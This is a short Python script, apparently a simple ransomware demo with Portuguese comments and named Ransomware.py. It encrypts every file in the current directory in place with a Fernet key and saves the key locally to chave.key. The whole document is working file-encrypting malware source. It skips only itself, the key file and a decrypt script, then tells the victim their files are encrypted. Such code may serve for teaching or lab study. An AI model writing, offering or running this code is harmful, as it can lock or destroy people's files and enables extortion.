import os
from cryptography.fernet import Fernet

# Lista para armazenar os nomes dos ficheiros a serem criptografados
ficheiros = []
for file in os.listdir():
    if file == "Ransomware.py" or file == "chave.key" or file == "Decrypt.py":
        continue
    if os.path.isfile(file):
        ficheiros.append(file)

print("Ficheiros encriptados: ", ficheiros)

# Gerar uma chave de criptografia
key = Fernet.generate_key()
with open("chave.key", "wb") as chave:
    chave.write(key)

# Criptografar cada ficheiro na lista
for file in ficheiros:
    with open(file, "rb") as chave:
        content = chave.read()
    content_encrypt = Fernet(key).encrypt(content)
    with open(file, "wb") as chave:
        chave.write(content_encrypt)

print("Todos os seus ficheiros foram encriptados!")
